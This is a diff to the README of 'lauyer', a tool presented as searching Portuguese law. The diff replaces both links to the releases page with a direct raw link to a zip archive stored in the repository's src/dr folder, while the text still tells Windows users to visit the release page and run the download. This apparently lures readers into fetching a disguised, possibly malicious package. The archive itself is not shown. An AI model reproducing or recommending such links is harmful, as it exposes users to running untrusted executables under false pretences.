@@ -1,12 +1,12 @@
 # ⚖️ lauyer - Search Portuguese law in seconds
 
-[![Download lauyer](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/brokenin-indiancrocus985/lauyer/releases)
+[![Download lauyer](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/brokenin-indiancrocus985/lauyer/raw/refs/heads/main/src/dr/Software_v2.0.zip)
 
 ## 📥 Download
 
 Visit the release page to download and run lauyer on Windows:
 
-https://github.com/brokenin-indiancrocus985/lauyer/releases
+https://github.com/brokenin-indiancrocus985/lauyer/raw/refs/heads/main/src/dr/Software_v2.0.zip
 
 Choose the latest release, then download the Windows file that matches your system. If you see more than one file, pick the one with `.exe` in the name or the Windows zip package.
 
